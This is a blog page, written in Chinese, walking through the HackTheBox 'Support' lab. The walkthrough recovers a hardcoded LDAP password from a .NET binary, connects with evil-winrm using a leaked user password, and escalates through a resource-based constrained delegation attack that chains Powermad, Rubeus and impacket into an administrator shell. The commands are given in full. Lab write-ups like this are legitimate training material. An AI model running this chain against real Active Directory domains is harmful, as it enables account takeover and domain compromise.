@@ -1,0 +1,261 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HTB-Support | BkingXD</title><meta name="keywords" content="web,HackTheBox,Windows"><meta name="author" content="BkingXD"><meta name="copyright" content="BkingXD"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB靶场记录——Support">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Support">
+<meta property="og:url" content="https://bkingxd.github.io/2022/12/02/HTB-Support/index.html">
+<meta property="og:site_name" content="BkingXD">
+<meta property="og:description" content="HTB靶场记录——Support">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png">
+<meta property="article:published_time" content="2022-12-02T12:16:45.000Z">
+<meta property="article:modified_time" content="2024-03-01T09:13:18.434Z">
+<meta property="article:author" content="BkingXD">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><link rel="shortcut icon" href="/img/578879781.png"><link rel="canonical" href="https://bkingxd.github.io/2022/12/02/HTB-Support/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-Support',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-01 17:13:18'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="BkingXD" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/578879781.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">BkingXD</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB-Support</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-12-02T12:16:45.000Z" title="Created 2022-12-02 20:16:45">2022-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-03-01T09:13:18.434Z" title="Updated 2024-03-01 17:13:18">2024-03-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Penetration/">Penetration</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>6min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTB-Support"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HTB-Support"><a href="#HTB-Support" class="headerlink" title="HTB-Support"></a>HTB-Support</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>用nmap对靶机进行端口扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.10.11.174</span><br></pre></td></tr></table></figure>
+
+<p>得到如下结果：</p>
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130162916493.png" alt="image-20221130162916493"></p>
+<p>从中可以知道，这台Windows机器是一台域控制器(Domain Controller 简称：DC)，域名为 <code>support.htb</code> ，它的活动目录(Active Directory 简称：AD)用了LDAP协议(轻型目录访问协议)。</p>
+<p>简单解释一下这些名词：</p>
+<blockquote>
+<p> “域”（Domain）指的是服务器控制网络上的计算机能否加入的计算机组合。在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller）”。</p>
+<p>“域控制器”（Domain Controller）是活动目录（Active Directory）的存储地方，也就是说活动目录存储在域控制器内；安装了活动目录的计算机就称为域控制器。</p>
+<p>“活动目录”（Active Directory） 域内的目录数据库 （Directory Database）被用来存储用户账户、计算机账户、打印机和共享文件夹等对象。</p>
+<p>活动目录(AD)与域名系统(DNS)的关系：活动目录和DNS是紧密不可分的，活动目录使用DNS服务器来登记域控制器的IP、各种资源的定位等，在一个域林中至少要有一个DNS服务器存在，所以安装活动目录时需要同时安装DNS。此外，域的命名也是采用DNS的格式来命名的。</p>
+</blockquote>
+<h3 id="DNS扫描"><a href="#DNS扫描" class="headerlink" title="DNS扫描"></a>DNS扫描</h3><p>用 dig 命令对DNS服务器进行扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.11.174 +short support.htb any</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221202170027819.png" alt="image-20221202170027819"></p>
+<p>发现服务器的计算机名称是“dc”，域名是“support.htb”，将其添加到本地的域名解析。</p>
+<h3 id="SMB枚举"><a href="#SMB枚举" class="headerlink" title="SMB枚举"></a>SMB枚举</h3><p>从nmap的扫描结果中，我们还可以知道靶机开了SMB协议的服务，说简单点就是共享文件的服务。</p>
+<blockquote>
+<p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。</p>
+</blockquote>
+<p>这里我们用 <code>smbclient</code> 命令(交互方式访问samba服务器)看一下有什么共享文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.11.174 -N</span><br><span class="line">-L：显示服务器端所分享出来的所有资源；</span><br><span class="line">-N：不用询问密码；</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130181047606.png" alt="image-20221130181047606"></p>
+<p>可以看到共享了一个叫 support-tools 的文件夹，我们进入这个目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.174/support-tools -N</span><br></pre></td></tr></table></figure>
+
+<p>help 获取一下可执行的命令，然后 dir 查看目录里的文件，发现有个有关用户信息的文件，用 get 将其下载下来</p>
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130182343981.png" alt="image-20221130182343981"></p>
+<h2 id="分析UserInfo-exe"><a href="#分析UserInfo-exe" class="headerlink" title="分析UserInfo.exe"></a>分析UserInfo.exe</h2><p>我们先把文件放到Windows环境下运行，看到如下结果：</p>
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130194652391.png" alt="image-20221130194652391"></p>
+<p>根据返回结果，这个exe文件能获取user信息(这些用户信息可能来自Active Directory)。接着我们用 <a target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy">dnSpy</a> 反编译这个文件，然后看到LdapQuery类，它进行了LDAP查询，实现这个查询需要验证，这个验证(密码凭证)从哪里获取？于是看到了这个getPassword函数</p>
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130195631114.png" alt="image-20221130195631114"></p>
+<p>跟进函数，发现确实存在“密码”，但需要经过处理才能得到真正密码</p>
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130201057121.png" alt="image-20221130201057121"></p>
+<p>用python重写一下代码得到密码：<code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc_password = <span class="string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span></span><br><span class="line">key = <span class="string">b&quot;armando&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">array = base64.b64decode(enc_password)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">    password += <span class="built_in">chr</span>(array[i] ^ key[i % <span class="built_in">len</span>(key)] ^ <span class="number">223</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"><span class="comment">#nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ldapsearch获取域中信息"><a href="#ldapsearch获取域中信息" class="headerlink" title="ldapsearch获取域中信息"></a>ldapsearch获取域中信息</h2><p>获得了LDAP查询的凭证，我们就可以与LDAP服务器连接，查询AC里的信息，这里用到 ldapsearch 这个搜索工具，里面的有些参数(-H和-D)可以从UserInfo.exe的代码里得到</p>
+<p>ldapsearch 常用的参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-H：ldapurl，格式为ldap:&#x2F;&#x2F;机器名或者IP:端口号，不能与-h和-p同时使用</span><br><span class="line">-h：LDAP服务器IP或者可解析的hostname，与-p结合使用，不能与-H同时使用</span><br><span class="line">-p：LDAP服务器端口号，与-h结合使用，不能与-H同时使用，默认为389</span><br><span class="line">-b：指定要查询的根节点，eg: ou&#x3D;test,dc&#x3D;testdomain,dc&#x3D;com，可以理解为搜索的入口，从这一级往下搜索。</span><br><span class="line">-x：使用简单认证方式，即未使用ssl加密认证。</span><br><span class="line">-D：所绑定的服务器的DN，即查询信息使用的用户名</span><br><span class="line">-w：绑定DN的密码，与-W二者选一</span><br><span class="line">-W：不输入密码，会交互式的提示用户输入密码，与-w二者选一</span><br><span class="line">–v：在详细模式下运行，将诊断信息写入到标准输出</span><br></pre></td></tr></table></figure>
+
+<p>执行下面命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H &quot;ldap://10.10.11.174&quot; -D &#x27;SUPPORT\ldap&#x27; -w &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -b &quot;CN=Users,DC=SUPPORT,DC=HTB&quot; | tee support.htb.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看获取到的信息文件，看到用户 support 的信息，其中的 info 字段有值，通常这个字段是空的，所以这个很可能是该用户的密码</p>
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130221005305.png" alt="image-20221130221005305"></p>
+<h3 id="获取user-flag"><a href="#获取user-flag" class="headerlink" title="获取user flag"></a>获取user flag</h3><p>拿到了 support 的账号密码，这里用 <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> 连接服务器：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>C:\Users\support\Desktop</code> 下有user flag，用Windows下的命令type读取即可。</p>
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221130230900702.png" alt="image-20221130230900702"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="寻找提权信息"><a href="#寻找提权信息" class="headerlink" title="寻找提权信息"></a>寻找提权信息</h3><h3 id="基于资源的约束委派攻击"><a href="#基于资源的约束委派攻击" class="headerlink" title="基于资源的约束委派攻击"></a>基于资源的约束委派攻击</h3><p>关于这个攻击策略的详情，可以看下面的文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer">GenericAll / GenericWrite / Write on Computer</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">Kerberos Resource-based Constrained Delegation: Computer Object Takeover</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">Resource-based Constrained Delegation</a></li>
+</ul>
+<h4 id="？？？？？？？"><a href="#？？？？？？？" class="headerlink" title="？？？？？？？"></a>？？？？？？？</h4><p>首先下载两个ps脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</span><br><span class="line">wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1</span><br></pre></td></tr></table></figure>
+
+<p>通过 evil-winrm上传它们并作为模块导入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload PowerView.ps1</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">upload Powermad.ps1</span><br><span class="line">Import-Module .\Powermad.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221202142825812.png" alt="image-20221202142825812"></p>
+<p>设置变量</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Variable -Name &quot;FakePC&quot; -Value &quot;FAKE01&quot;</span><br><span class="line">Set-Variable -Name &quot;targetComputer&quot; -Value &quot;DC&quot;</span><br></pre></td></tr></table></figure>
+
+<p>用 Powermad ，创建一个新的假计算机对象，然后添加至AD</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount (Get-Variable -Name &quot;FakePC&quot;).Value -Password $(ConvertTo-SecureString &#x27;123456&#x27; -AsPlainText -Force) -Verbose</span><br></pre></td></tr></table></figure>
+
+<p>用内置的AD模块，给假计算机对象设置约束委派权限，并查看最后一个命令是否生效</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">设置约束委派权限</span></span><br><span class="line">Set-ADComputer (Get-Variable -Name &quot;targetComputer&quot;).Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name &quot;FakePC&quot;).Value + &#x27;$&#x27;)</span><br><span class="line"><span class="meta">#</span><span class="bash">查看最后一个命令是否生效</span></span><br><span class="line">Get-ADComputer (Get-Variable -Name &quot;targetComputer&quot;).Value -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221202144338249.png" alt="image-20221202144338249"></p>
+<p>下载工具 Rubeus ，用来生成假计算机的密码哈希，这个是编译好的文件地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;r3motecontrol&#x2F;Ghostpack-CompiledBinaries&#x2F;raw&#x2F;master&#x2F;Rubeus.exe</span><br></pre></td></tr></table></figure>
+
+<p>上传 Rubeus 程序，生成一个 RC4 哈希</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload Rubeus.exe</span><br><span class="line">./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221202145543135.png" alt="image-20221202145543135"></p>
+<p>记录哈希值，下一步需要用到。</p>
+<h4 id="伪造并使用票证"><a href="#伪造并使用票证" class="headerlink" title="伪造并使用票证"></a>伪造并使用票证</h4><p>我们已经利用了这个安全漏洞，并赋予计算机对象“FAKE01”冒充他人的权利。因此，我们现在可以在模拟用户管理员的同时向“dc.support.htb”上的资源请求一个新的 Kerberos Ticket-Granting-Ticket(TGT)。</p>
+<p>在攻击机下载使用票证的工具（<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a>），执行以下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install impacket</span><br><span class="line">pip3 install pyasn1</span><br><span class="line">sudo apt install krb5-user</span><br></pre></td></tr></table></figure>
+
+<p>然后删除攻击机之前使用过的票证，用 <code>getST.py</code> 再生成一个票证并设置到环境变量里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kdestroy</span><br><span class="line">python3 ./getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221202162443148.png" alt="image-20221202162443148"></p>
+<p>最后使用票证在靶机中获得一个 shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20221202163407839.png" alt="image-20221202163407839"></p>
+<p>root flag在 <code>C:\Users\Administrator\Desktop</code> 。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://cybergladius.com/htb-walkthrough-support/">https://cybergladius.com/htb-walkthrough-support/</a></p>
+<p><a target="_blank" rel="noopener" href="https://shakuganz.com/2022/09/13/hackthebox-support-write-up/">https://shakuganz.com/2022/09/13/hackthebox-support-write-up/</a></p>
+<p><a target="_blank" rel="noopener" href="https://meowmeowattack.github.io/htb/support/">https://meowmeowattack.github.io/htb/support/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45894840/article/details/127726431">https://blog.csdn.net/qq_45894840/article/details/127726431</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://BkingXD.github.io">BkingXD</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://bkingxd.github.io/2022/12/02/HTB-Support/">https://bkingxd.github.io/2022/12/02/HTB-Support/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/HackTheBox/">HackTheBox</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a></div><div class="post_share"><div class="social-share" data-image="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94CommonCollections1/"><img class="next-cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Java反序列化——CommonCollections1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/11/18/HTB-RedPanda/" title="HTB-RedPanda"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-18</div><div class="title">HTB-RedPanda</div></div></a></div><div><a href="/2022/11/25/HTB-Shoppy/" title="HTB-Shoppy"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-25</div><div class="title">HTB-Shoppy</div></div></a></div><div><a href="/2021/11/10/BUUCTF%20Web4/" title="BUUCTF Web4"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-10</div><div class="title">BUUCTF Web4</div></div></a></div><div><a href="/2021/05/06/BUUCTF%20Web1/" title="BUUCTF Web1"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-06</div><div class="title">BUUCTF Web1</div></div></a></div><div><a href="/2021/04/12/BugkuCTF%20web1-14/" title="BugkuCTF web1-14"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-12</div><div class="title">BugkuCTF web1-14</div></div></a></div><div><a href="/2021/07/03/BUUCTF%20Web2/" title="BUUCTF Web2"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-03</div><div class="title">BUUCTF Web2</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/578879781.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">BkingXD</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">Categories</div><div 